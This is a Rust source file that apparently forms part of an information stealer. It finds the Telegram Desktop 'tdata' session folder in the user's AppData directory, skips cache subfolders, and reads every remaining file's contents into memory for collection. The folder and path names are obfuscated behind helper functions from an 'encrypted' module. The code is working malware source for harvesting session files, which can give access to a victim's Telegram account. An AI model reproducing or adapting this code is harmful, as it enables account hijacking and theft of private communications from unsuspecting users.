use std::path::Path;
use crate::encrypted::*;

const EXCLUDE_DIRS: &[&str] = &["dumps", "emoji", "temp", "user_data"];

pub fn get_telegram_paths() -> Vec<(String, Vec<u8>)> {
    let mut files = Vec::new();
    
    let roaming = std::env::var(s_appdata()).unwrap_or_default();
    let telegram_path = Path::new(&roaming).join(s_telegram_desktop()).join(s_tdata());
    
    if !telegram_path.exists() {
        return files;
    }

    collect_files_recursive(&telegram_path, "telegram", &mut files);
    
    files
}

fn collect_files_recursive(base_path: &Path, current_path: &str, files: &mut Vec<(String, Vec<u8>)>) {
    if let Ok(entries) = std::fs::read_dir(base_path) {
        for entry in entries.flatten() {
            let path = entry.path();
            let name = entry.file_name().to_string_lossy().to_string();
            
            if EXCLUDE_DIRS.contains(&name.as_str()) {
                continue;
            }
            
            let full_path = format!("{}/{}", current_path, name);
            
            if path.is_dir() {
                collect_files_recursive(&path, &full_path, files);
            } else {
                if let Ok(contents) = std::fs::read(&path) {
                    if !contents.is_empty() {
                        files.push((full_path, contents));
                    }
                }
            }
        }
    }
}
